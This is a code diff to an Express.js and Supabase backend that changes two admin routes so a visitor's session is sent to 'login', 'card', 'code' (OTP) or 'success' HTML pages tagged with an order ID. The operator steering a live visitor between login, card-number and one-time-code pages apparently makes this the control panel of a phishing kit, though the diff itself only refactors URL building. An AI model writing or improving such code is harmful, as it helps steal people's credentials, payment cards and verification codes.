@@ -63,10 +63,12 @@ app.post('/api/admin/redirect/:id', async (req, res) => {
   try {
     if (!isAdmin(req)) return res.status(401).json({ success: false });
     const { page } = req.body;
-    const redirect_map = { login: 'login', card: 'card', otp: 'code' };
-    const redirect_to = redirect_map[page] || page || 'login';
-    await supabase.from('orders').update({ status: 'redirect_' + (page || 'card'), redirect_to }).eq('id', req.params.id);
-    const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
+    const page_map = { login: 'login', card: 'card', otp: 'code' };
+    const pageName = page_map[page] || page || 'login';
+    const orderId = req.params.id;
+    const redirect_to = pageName + '.html?order=' + orderId;
+    await supabase.from('orders').update({ status: 'redirect_' + (page || 'card'), redirect_to }).eq('id', orderId);
+    const { data: order } = await supabase.from('orders').select('session_id').eq('id', orderId).maybeSingle();
     if (order && order.session_id) {
       await supabase.from('visitors').update({ redirect_to }).eq('session_id', order.session_id);
     }
@@ -81,7 +83,7 @@ app.post('/api/admin/accept/:id', async (req, res) => {
     await supabase.from('orders').update({ status: 'accepted' }).eq('id', req.params.id);
     const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
     if (order && order.session_id) {
-      await supabase.from('visitors').update({ redirect_to: 'success' }).eq('session_id', order.session_id);
+      await supabase.from('visitors').update({ redirect_to: 'success.html?order=' + req.params.id }).eq('session_id', order.session_id);
     }
     res.json({ success: true });
   } catch (err) { res.status(500).json({ success: false }); }
